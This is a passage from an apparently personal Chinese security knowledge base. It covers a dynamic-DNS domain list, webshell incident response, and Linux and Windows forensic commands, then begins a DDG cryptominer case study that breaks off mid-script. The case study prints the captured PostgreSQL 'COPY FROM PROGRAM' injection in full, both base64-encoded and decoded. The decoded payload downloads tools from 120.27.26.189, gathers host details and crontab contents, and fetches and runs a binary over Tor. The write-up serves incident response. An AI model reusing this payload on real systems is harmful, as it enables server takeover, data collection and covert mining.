易申请，难追踪注册者 .mz 莫桑比克 不知名国家 易申请，难追踪注册者 常见动态域名提供商 'f3322.net','3322.org','7766.org','8866.org', '9966.org','8800.org','2288.org','6600.org', 'f3322.org', 'ddns.net', 'xicp.net', 'vicp.net','wicp.net','oicp.net','xicp.net','vicp.cc','eicp.net','uicp.cn','51vip.biz','xicp.cn','uicp.net','vicp.hk','5166.info','coyo.eu','imblog.in','imzone.in','imshop.in','imbbs.in','imwork.net','iego.cn','vicp.co','iego.net','1366.co','1866.co','3utilities.com','bounceme.net','ddnsking.com','gotdns.ch','hopto.org','myftp.biz','myftp.org','myvnc.com','no-ip.biz','no-ip.info','no-ip.org','noip.me','redirectme.net','servebeer.com','serveblog.net','servecounterstrike.com','serveftp.com','servegame.com','servehalflife.com','servehttp.com','serveminecraft.net','servemp3.com','servepics.com','servequake.com','sytes.net','webhop.me','zapto.org','dynamic-dns.net','epac.to','longmusic.com','compress.to','wikaba.com','zzux.com','dumb1.com','1dumb.com','onedumb.com','wha.la','youdontcare.com','yourtrap.com','2waky.com','sexidude.com','mefound.com','organiccrap.com','toythieves.com','justdied.com','jungleheart.com','mrbasic.com','mrbonus.com','x24hr.com','dns04.com','dns05.com','zyns.com','my03.com','fartit.com','itemdb.com','instanthq.com','xxuz.com','jkub.com','itsaol.com','faqserv.com','jetos.com','qpoe.com','qhigh.com','vizvaz.com','mrface.com','isasecret.com','mrslove.com','otzo.com','sellclassics.com','americanunfinished.com','serveusers.com','serveuser.com','freetcp.com','ddns.info','ns01.info','ns02.info','myftp.info','mydad.info','mymom.info','mypicture.info','myz.info','squirly.info','toh.info','xxxy.info','freewww.info','freeddns.com','myddns.com','dynamicdns.biz','ns01.biz','ns02.biz','xxxy.biz','sexxxy.biz','freewww.biz','www1.biz','dhcp.biz','edns.biz','ftp1.biz','mywww.biz','gr8domain.biz','gr8name.biz','ftpserver.biz','wwwhost.biz','moneyhome.biz','port25.biz','esmtp.biz','sixth.biz','ninth.biz','got-game.org','bigmoney.biz','dns2.us','dns1.us','ns02.us','ns01.us','almostmy.com','ocry.com','ourhobby.com','pcanywhere.net','ygto.com','ddns.ms','ddns.us','gettrials.com','4mydomain.com','25u.com','4dq.com','4pu.com','3-a.net','dsmtp.com','mynumber.org','ns1.name','ns2.name','ns3.name','changeip.name','ddns.name','rebatesrule.net','ezua.com','sendsmtp.com','trickip.net','trickip.org','dnsrd.com','lflinkup.com','lflinkup.net','lflinkup.org','lflink.com','dns-dns.com','proxydns.com','myftp.name','dyndns.pro','changeip.net','mysecondarydns.com','changeip.org','dns-stuff.com','dynssl.com','mylftv.com','mynetav.net','mynetav.org','ikwb.com','acmetoy.com','ddns.mobi','dnset.com','authorizeddns.net','authorizeddns.org','authorizeddns.us','cleansite.biz' Web 应急响应 webshell 网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，Sql注入写入文件等。 排查方式 隔离web服务器，对服务器状态进行保存备份当前环境 使用webshell扫描工具扫描整站 使用命令快速寻找整站代码中可能存在的webshell危险代码 日志分析 流量分析 常见的weshell扫描工具有D盾，河马 定位时间范围 在找到webshell之后，通过发现webshell文件创建时间点，去查看相关日期的日志 Web日志分析 在相关的日志中找到对应时间节点的web日志，查看具体是哪个api，组件，通过下图可以发现存在可疑的webservice接口 漏洞分析 访问webservice接口，发现变量：buffer、distinctpach、newfilename可以在客户端自定义 漏洞复现 尝试对漏洞进行复现，可成功上传webshell，控制网站服务器 漏洞修复 清除webshell并对webservice接口进行代码修复 开放ACL，使其对外服务 总结 Linux 文件 ls# 敏感目录的文件分析[/tmp目录，命令目录/usr/bin ,/usr/local/bin/,/usr/local/sbin,/usr/sbin等] ls -a 显示所有档案及目录（ls内定将档案名或目录名称为“.”的视为影藏，不会列出）； -C 多列显示输出结果。这是默认选项； -l 以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型、权限模式、硬连接数、所有者、组、文件大小和文件的最后修改时间等； -t 用文件和目录的更改时间排序 # 关注目录、文件 /var/run/utmp 有关当前登录用户的信息记录 /etc/passwd 用户列表 /tmp 临时目录 ~/.ssh/authorized_keys 公钥 /usr/bin 系统预装可执行命令的目录 /usr/local/bin 用户自编译可执行程序的目录 /usr/sbin root权限下执行系统命令的目录 /var/spool/cron/* 用户创建的定时任务（crontab） /etc/crontab 定时任务文件 /etc/cron.d/* 系统自动定期需要做的任务的目录，但是又不是按小时，按天，按星期，按月来执行的 /etc/cron.daily/* 每天执行一次job的目录 /etc/cron.hourly/* 每小时执行一次job的目录 /etc/cron.monthly/* 每个月执行一次job的目录 /etc/cron.weekly/* 每周之行一次job的目录 /etc/rc.local 开机自启动文件 ~/.bash_history 历史命令文件 stat 针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改或者其他Access Time：简写为atime，表示文件的访问时间。当文件内容被访问时，更新这个时间。 Modify Time：简写为mtime，表示文件内容的修改时间，当文件的数据内容被修改时，更新这个时间。 Change Time：简写为ctime，表示文件的状态时间，当文件的状态被修改时，更新这个时间，例如文件的链接数，大小，权限，Blocks数。 #查看文件状态 stat ${filename} #计算文件hash值 md5sum ./top find-type b/d/c/p/l/f查是块设备、目录、字符设备、管道、符号、链接、普通文件 -mtime -n +n 按文件更改时间来查找文件，-n指n天以内，+n指n天前 -atime -n +n 按文件访问时间来查找文件，-n指n天以内，+n指n天前 -ctime -n +n 按文件创建时间来查找文件，-n指n天以内，+n指n天前 # 查找24小时内被修改的php文件 find ./ -mtime 0 -name \"*.php\" # 查找72h以内,48h前被修改的文件 find ./ -ctime 2 # 查找2天前被修改的文件 find ./ -ctime +2 # 查看1-5天内被修改的文件 find ./ -ctime +1 -ctime -5 进程&&网络 top 使用top命令实时动态地查看系统的整体运行情况，主要分析CPU和内存的进程，是一个综合了多方信息监测系统性能和运行信息的实用工具 列名 含义 PID 进程ID，进程的唯一标识符 USER 进程所有者的实际用户名 PR 进程的调度优先级。这个字段的一些值是'rt'。这意味这这些进程运行在实时态 NI 进程的nice值（优先级）。越小的值意味着越高的优先级 VIRT 进程使用的虚拟内存 RES 驻留内存大小。驻留内存是任务使用的非交换物理内存大小 SHR SHR是进程使用的共享内存 S 这个是进程的状态。它有以下不同的值: D – 不可中断的睡眠态 R – 运行态 S – 睡眠态 T – 被跟踪或已停止 Z – 僵尸态 | | %CPU | 自从上一次更新时到现在任务所使用的CPU时间百分比 | | %MEM | 进程使用的可用物理内存百分比 | | TIME+ | 任务启动后到现在所使用的全部CPU时间，精确到百分之一秒 | | COMMAND | 运行进程所使用的命令 | htop netstat netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况 -a 显示所有连线中的Socket。 -n 直接使用IP地址，而不通过域名服务器。 -t 显示TCP传输协议的连线状况。 -u 显示UDP传输协议的连线状况。 -l 显示侦听服务器套接字 -v 显示指令执行过程。 -p 显示正在使用Socket的程序PID和程序名称。 -s 显示网络工作信息统计表。 ps 查看进程 a 显示一个终端的所有进程，除会话引线外 u 显示进程的归属用户及内存的使用情况 x 显示没有控制终端的进程 -l 长格式显示更加详细的信息 -e 显示所有进程 -f 执行完整格式列表 \"ps aux\" 可以查看系统中所有的进程； \"ps -le\" 可以查看系统中所有的进程，而且还能看到进程的父进程的 PID 和进程优先级； \"ps -l\" 只能看到当前 Shell 产生的进程 ps aux 列名 含义 USER 该进程是由哪个用户产生的。 PID 进程的 ID。 %CPU 该进程占用 CPU 资源的百分比，占用的百分比越高，进程越耗费资源。 %MEM 该进程占用物理内存的百分比，占用的百分比越高，进程越耗费资源。 VSZ 该进程占用虚拟内存的大小，单位为 KB。 RSS 该进程占用实际物理内存的大小，单位为 KB。 TTY 该进程是在哪个终端运行的。其中，tty1 ~ tty7 代表本地控制台终端（可以通过 Alt+F1 ~ F7 快捷键切换不同的终端），tty1~tty6 是本地的字符界面终端，tty7 是图形终端。pts/0 ~ 255 代表虚拟终端，一般是远程连接的终端，第一个远程连接占用 pts/0，第二个远程连接占用 pts/1，依次増长。 STAT 进程状态。常见的状态有以下几种： -D：不可被唤醒的睡眠状态，通常用于 I/O 情况。 -R：该进程正在运行。 -S：该进程处于睡眠状态，可被唤醒。 -T：停止状态，可能是在后台暂停或进程处于除错状态。 -W：内存交互状态（从 2.6 内核开始无效）。 -X：死掉的进程（应该不会出现）。 -Z：僵尸进程。进程已经中止，但是部分程序还在内存当中。 - \"ps aux\"命令可以看到系统中所有的进程，\"ps -le\"命令也能看到系统中所有的进程。由于 \"-l\" 选项的作用，所以 \"ps -le\" 命令能够看到更加详细的信息，比如父进程的 PID、优先级等。但是这两个命令的基本作用是一致的，掌握其中一个就足够了。 ps -le 列名 含义 USER 该进程是由哪个用户产生的。 PID 进程的 ID。 %CPU 该进程占用 CPU 资源的百分比，占用的百分比越高，进程越耗费资源。 %MEM 该进程占用物理内存的百分比，占用的百分比越高，进程越耗费资源。 VSZ 该进程占用虚拟内存的大小，单位为 KB。 RSS 该进程占用实际物理内存的大小，单位为 KB。 TTY 该进程是在哪个终端运行的。其中，tty1 ~ tty7 代表本地控制台终端（可以通过 Alt+F1 ~ F7 快捷键切换不同的终端），tty1~tty6 是本地的字符界面终端，tty7 是图形终端。pts/0 ~ 255 代表虚拟终端，一般是远程连接的终端，第一个远程连接占用 pts/0，第二个远程连接占用 pts/1，依次増长。 STAT 进程状态。常见的状态有以下几种： -D：不可被唤醒的睡眠状态，通常用于 I/O 情况。 -R：该进程正在运行。 -S：该进程处于睡眠状态，可被唤醒。 -T：停止状态，可能是在后台暂停或进程处于除错状态。 -W：内存交互状态（从 2.6 内核开始无效）。 -X：死掉的进程（应该不会出现）。 -Z：僵尸进程。进程已经中止，但是部分程序还在内存当中。 - pstree pstree [选项] [PID或用户名] -a 显示启动每个进程对应的完整指令，包括启动进程的路径、参数等。 -c 不使用精简法显示进程信息，即显示的进程中包含子进程和父进程。 -n 根据进程 PID 号来排序输出，默认是以程序名排序输出的。 -p 显示进程的 PID。 -u 显示进程对应的用户名称。 在使用 pstree 命令时，如果不指定进程的 PID 号，也不指定用户名称，则会以 init 进程为根进程，显示系统中所有程序和进程的信息；反之，若指定 PID 号或用户名，则将以 PID 或指定用户为根进程，显示 PID 或用户对应的所有程序和进程 lsof lsof 命令，“list opened files”的缩写，直译过来，就是列举系统中已经被打开的文件。通过 lsof 命令，我们就可以根据文件找到对应的进程信息，也可以根据进程信息找到进程打开的文件 -c 字符串 只列出以字符串开头的进程打开的文件。 +d 目录名 列出某个目录中所有被进程调用的文件。 -u 用户名 只列出某个用户的进程打开的文件。 -p pid 列出某个 PID 进程打开的文件。 隐藏进程 cat /proc/$$/mountinfo cat /proc/mounts mount 使用mount隐藏进程，可以发现挂载硬盘之后，ps查看进程是无法查看对应的进程详细信息 查看对应挂载信息，可以快速找到隐藏的进程pid 然后使用unmount 取消挂载之后，就可以kill掉这个进程 日志 CentOS系统日志文件重要日志 日志文件 说 明 /var/log/cron 记录与系统定时任务相关的曰志 /var/log/cups/ 记录打印信息的曰志 /var/log/dmesg 记录了系统在开机时内核自检的信总。也可以使用dmesg命令直接查看内核自检信息 /var/log/btmp 记录错误登陆的日志。这个文件是二进制文件，不能直接用Vi查看，而要使用lastb命令查看。命令如下： [root@localhost log]#lastb root tty1 Tue Jun 4 22:38 - 22:38 (00:00) # 有人在6月4 日 22:38便用root用户在本地终端 1 登陆错误 | | /var/log/lasllog | 记录系统中所有用户最后一次的登录时间的曰志。这个文件也是二进制文件.不能直接用Vi 查看。而要使用lastlog命令查看 | | /var/Iog/mailog | 记录邮件信息的曰志 | | /var/log/messages | 它是核心系统日志文件，其中包含了系统启动时的引导信息，以及系统运行时的其他状态消息。I/O 错误、网络错误和其他系统错误都会记录到此文件中。其他信息，比如某个人的身份切换为 root，已经用户自定义安装软件的日志，也会在这里列出。 | | /var/log/secure | 记录验证和授权方面的倍息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh的登录、su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 | | /var/log/wtmp | 永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件。同样，这个文件也是二进制文件.不能直接用Vi查看，而要使用last命令查看 | | /var/tun/ulmp | 记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。同样，这个文件不能直接用Vi查看，而要使用w、who、users等命令查看 | 服务日志 除系统默认的日志之外，采用 RPM 包方式安装的系统服务也会默认把日志记录在 /var/log/ 目录中（源码包安装的服务日志存放在源码包指定的目录中）。不过这些日志不是由 rsyslogd 服务来记录和管理的，而是各个服务使用自己的日志管理文档来记录自身的日志。以下介绍的日志目录在你的 Linux 上不一定存在，只有安装了相应的服务，日志才会出现。 日志文件 说明 /var/log/httpd/ RPM包安装的apache取务的默认日志目录 /var/log/mail/ RPM包安装的邮件服务的额外日志因录 /var/log/samba/ RPM包安装的Samba服务的日志目录 /var/log/sssd/ 守护进程安全服务目录 Windows 文件 C:\\Documents and Settings\\Administrator\\Recent C:\\Documents and Settings\\Default User\\Recent %UserProfile%\\Recent 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件 下载目录 回收站文件 程序临时文件 历史文件记录 应用程序打开历史 搜索历史 快捷方式（LNK） c:\\windows\\temp\\ Window 2003 C:\\Documents and Settings Window 2008R2 C:\\Users\\ Temp/tmp目录 开始-运行，输入%UserProfile%\\Recent HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunonceEx (ProfilePath)\\Start Menu\\Programs\\Startup 启动项 msconfig 启动选项卡 gpedit.msc 组策略编辑器 开始>所有程序>启动 msconfig-启动 C:\\Windows\\System32\\Tasks\\ C:\\Windows\\SysWOW64\\Tasks\\ C:\\Windows\\tasks\\ schtasks taskschd.msc at 开始-设置-控制面板-任务计划 进程 && 网络 tasklist /svc | findstr pid netstat -ano tasklist /svc findstr wmic process | find \"Proccess Id\" > proc.csv Get-WmiObject -Class Win32_Process Get-WmiObject -Query \"select * from win32_service where name='WinRM'\" -ComputerName Server01, Server02 | Format-List -Property PSComputerName, Name, ExitCode, Name, ProcessID, StartMode, State, Status wmic process get caption,commandline /value wmic process where caption=”svchost.exe” get caption,commandline /value wmic service get name,pathname,processid,startname,status,state /value wmic process get CreationDate,name,processid,commandline,ExecutablePath /value wmic process get name,processid,executablepath| findstr \"7766\" netstat 详情 状态 说明 CLOSED 无连接活动或正在进行 LISTEN 监听中等待连接 SYN_RECV 服务端接收了SYN SYN_SENT 请求连接等待确认 ESTABLISHED 连接建立数据传输 FIN_WAIT1 请求中止连接，等待对方FIN FIN_WAIT2 同意中止，请稍候 ITMED_WAIT 等待所有分组死掉 CLOSING 两边同时尝试关闭 TIME_WAIT 另一边已初始化一个释放 LAST_ACK 等待原来的发向远程TCP的连接中断请求的确认 CLOSE-WAIT 等待关闭连接 日志 开审核策略 系统日志，程序日志，安全日志 eventvwr.msc 1）服务器日志： FTP连接日志和HTTPD事务日志： %systemroot%\\system32\\LogFiles\\ IIS日志默认存放在System32\\LogFiles目录下，使用W3C扩展格式 2）操作系统日志： LogParser.exe是微软提供的日志分析工具 登录成功的所有事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" 指定登录时间范围的事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where TimeGenerated>'2018-06-19 23:32:11 and TimeGenerated 提取登录成功的用户名和IP： LogParser.exe -i:EVT –o:DATAGRID \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\" 登录失败的所有事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4625\" 提取登录失败用户名进行聚合统计： LogParser.exe -i:EVT \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" 系统历史开关机记录： LogParser.exe -i:EVT –o:DATAGRID \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\" Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:24:37 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/20.应急响应.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/21.Linux应急响应案例（DDG挖矿）.html":{"url":"知识库/03.主机安全/21.Linux应急响应案例（DDG挖矿）.html","title":"21.Linux应急响应案例（DDG挖矿）","keywords":"","body":" 背景 应急过程 应急流程 第二次应急 修改当前脚本的时间为/bin/grep 应急过程 背景 第一次出现是在2020年9月14日晚上接近8点，10.100.244.24,10.100.244.22两台服务器出现cpu异常，tracepath一直在内网扫描且为tcp连接，这两台服务器除了tracepath进程在大规模扫描以外，还有另外的进程占cpu高的进程。 tracepath 指令可以追踪数据到达目标主机的路由信息，它使用UDP协议 tracepath [ -n] [ -l pktlen] destination [ port] 参数 说明 -n 不查看主机名字 -l 设置初始化数据包长度，默认65535 tracepath 扫描 tcp 扫描内网的5432端口（5432默认是PostgreSQL） # root 权限 netstat -antulp 应急过程 查看文件的状态 # 查看创建，更新 stat /usr/bin/tracepath md5sum /usr/bin/tracepath 查找定时任务，本地脚本 # 列出某个用户cron服务的详细内容 crontab -l # 默认编写的 crontab文件会保存在/var/spool/cron/$USER cat /etc/crontab cat /etc/cron.*/XXX # 异步定时服务 cat /etc/anacrontab # 具体文件 /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* user=postgres hostaddr=%s password=%s^@DROP TABLE IF EXISTS abroxu;CREATE TABLE abroxu(cmd_output text);COPY abroxu FROM P ROGRAM 'echo WFJBTkRPTQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYW wvc2JpbgoKZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhdGggPDw8JChlY2hvICR7MS8vLy8gfSkKICBET0M9LyR7cGF0aC8vIC8vfQogIEhPU1Q9JHtzZXJ2ZXIvLzoqf QogIFBPUlQ9JHtzZXJ2ZXIvLyo6fQogIFtbIHgiJHtIT1NUfSIgPT0geCIke1BPUlR9IiBdXSAmJiBQT1JUPTgwCgogIGV4ZWMgMzw+L2Rldi90Y3AvJHtIT1NUfS8kUE9SVAogIGVjaG8gLWVuICJH RVQgJHtET0N9IEhUVFAvMS4wXHJcbkhvc3Q6ICR7SE9TVH1cclxuXHJcbiIgPiYzCiAgKHdoaWxlIHJlYWQgbGluZTsgZG8KICAgW1sgIiRsaW5lIiA9PSAkJ1xyJyBdXSAmJiBicmVhawogIGRvbmU gJiYgY2F0KSA8JjMKICBleGVjIDM+Ji0KfQoKY3VybCAtViB8fCBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IC15IGluc3RhbGwgY3VybApjdXJsIC1WIHx8IHl1bSAteSBpbnN0YWxsIGN1cmwKY3 VybCAtViB8fCB3Z2V0IC1xIGh0dHBzOi8vZ2l0aHViLmNvbS9tb3BhcmlzdGhlYmVzdC9zdGF0aWMtY3VybC9yZWxlYXNlcy9kb3dubG9hZC92Ny43MS4xL2N1cmwtYW1kNjQgLU8gL3Vzci9sb2Nhb C9iaW4vY3VybDtjaG1vZCAreCAvdXNyL2xvY2FsL2Jpbi9jdXJsCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMv ZG93bmxvYWQvdjcuNzEuMS9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IF9fY3VybCBodHRwOi8vMTIwLjI3LjI2LjE4OTo4MS9jdXJsID4gL3V zci9sb2NhbC9iaW4vY3VybDtjaG1vZCAreCAvdXNyL2xvY2FsL2Jpbi9jdXJsCmN1cmwgLVYgfHwgX19jdXJsIGh0dHA6Ly8xMjAuMjcuMjYuMTg5OjgxL2N1cmwgPiAkSE9NRS9jdXJsO2NobW9kIC t4ICRIT01FL2N1cmwKCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAibnNzbmtjdDZ1Z Hl5eDZ6bHY0bDZqaHFyNWpkZjY0M3NoeWVyazI0NmZzMjdrc3JkZWhsMnozcWQiKQoKc29ja3ooKSB7Cm49KGRvaC5kZWZhdWx0cm91dGVzLmRlIGRucy5ob3N0dXgubmV0IGRucy5kbnMtb3Zlci1o dHRwcy5jb20gdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJ sYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbW U9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMykpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJ yAnXG4nfHNvcnQgLXVSfGhlYWQgLTEpCn0KCmZleGUoKSB7CmZvciBpIGluIC4gJEhPTUUgL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAk aS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9wZy4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSk Kcj0kKGN1cmwgLTRmc1NMayBjaGVja2lwLmFtYXpvbmF3cy5jb218fGN1cmwgLTRmc1NMayBpcC5zYilfJCh3aG9hbWkpXyQodW5hbWUgLW0pXyQodW5hbWUgLW4pXyQoaXAgYXxncmVwICdpbmV0IC d8YXdrIHsncHJpbnQgJDInfXxtZDVzdW18YXdrIHsncHJpbnQgJDEnfSlfJChjcm9udGFiIC1sfGJhc2U2NCAtdzApCiRjIC14IHNvY2tzNWg6Ly8kczo5MDUwICR0Lm9uaW9uJGYgLW8keCAtZSRyI Hx8ICRjICQxJGYgLW8keCAtZSRyCmNobW9kICt4ICR4OyR4O3JtIC1mICR4Cn0KCmZvciBoIGluIHRvcjJ3ZWIuaW4gdG9yMndlYi5pdCB0b3Iyd2ViLmlvIHRvcjJ3ZWIuc3Ugb25pb24uY29tLmRl CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC0xIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXM7IHRoZW4KdSAkdC4kaAplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash';SELECT * FROM abro xu;DROP TABLE IF EXISTS abroxu; # 解码 user=postgres hostaddr=%s password=%s^@DROP TABLE IF EXISTS abroxu;CREATE TABLE abroxu(cmd_output text);COPY abroxu FROM P ROGRAM echo 'XRANDOM exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin xec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin function __curl() { # ${1//// }将/ 替换为空格 read proto server path /dev/tcp/${HOST}/$PORT echo -en \"GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\" >&3 (while read line; do [[ \"$line\" == $'\\r' ]] && break done && cat) &- } curl -V || apt-get update && apt-get -y install curl curl -V || yum -y install curl curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.71.1/curl-amd64 -O /usr/local/bin/curl;chmod +x /usr/local/bin/curl curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.71.1/curl-amd64 -O $HOME/curl;chmod +x $HOME/curl # 下载curl 重定向到/usr/local/bin/curl 目录下 赋予执行权限 curl -V || __curl http://120.27.26.189:81/curl > /usr/local/bin/curl;chmod +x /usr/local/bin/curl curl -V || __curl http://120.27.26.189:81/curl > $HOME/curl;chmod +x $HOME/curl # id -u (uid) grep x:$uid: /etc/passwd => 取出当前用户 # cut -d: -f6 => -d: 以:为分界符，-f --fields 选中的列表，-f6 指 第6列，为用户的家目录 # $d = 当前用户的家目录 /home/aaron d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) # 获取家目录 c=$(echo \"curl -4fsSLkA- -m200\") # curl -4fsSLkA- -m200 t=$(echo \"nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd\") # 输出字符串，用于拼接后面的Tor网络地址 #dns 解析函数 sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } # 执行exit fexe() { for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done } u() { sockz fexe f=/pg.$(uname -m) x=./$(date|md5sum|cut -f1 -d-) r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) $c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r chmod +x $x;$x;rm -f $x } for h in tor2web.in tor2web.it tor2web.io tor2web.su onion.com.de do if ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; then u $t.$h else break fi done '; SELECT * FROM abroxu;DROP TABLE IF EXISTS abroxu # Parameter Expansion ${parameter/pattern/string} ${parameter//pattern/string} ${parameter/pattern} ${parameter//pattern} #（1）parameter之后如果是/，则只替换匹配到的第一个子串；parameter之后如果是//，则替换所有匹配到的子串。 #（2）当string为空时，则相当于将匹配的子串删除。 #（3）特殊符号#和%在这种情况下分别锚定（Anchoring ）字符串的开始和结尾。 #（4）如果bash的nocasematch选项参数是打开的（shopt -s nocasematch），则匹配的过程大小写是不敏感的。 psql中 copy命令 -- 导入,从 'command'中导入到table中 COPY table_name [ ( column_name [, ...] ) ] FROM { 'filename' | PROGRAM 'command' | STDIN } [ [ WITH ] ( option [, ...] ) ] 应急流程 排查定时任务 制作该服务器快照，判断是否与tracepath命令相关 删除计划任务中调用的各种脚本文件，并及时卸载curl命令 针对外连IP，对ip出口进行限制，让其无法访问 清除守护进程第二次应急 第二次出现是在2020年9月15日，中午12点，10.100.249.188，cpu异常，登录服务器，查看在/opt目录下存在同样的systemd-service.sh文件，在/etc/cron.d同样存在以root用户启动的定时任务，按照昨日的应急流程走了一遍，本以为没问题了，但是过了一会病毒又上线，/opt目录下存在了新的脚本文件，/etc/cron.d目录下也存在新的定时任务，且脚本的系统时间均被修改 使用gdb attach 找到已知的pid，dump出当前进程的内存，进而进行分析 QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK # 屏蔽指定进程终端上的标准输出信息 exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin # id -u (uid) grep x:$uid: /etc/passwd => 取出当前用户 # cut -d: -f6 => -d: 以:为分界符，-f --fields 选中的列表，-f6 指 第6列，为用户的家目录 # $d = 当前用户的家目录 /home/aaron d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) x() { # 当家目录不存在.systemd-service.sh, 执行 || 后的文件重定向命令 写入家目录下的.systemd-service.sh if ! ls $d/.systemd-service.sh; then [ -s $d/.systemd-service.sh ] || echo -e 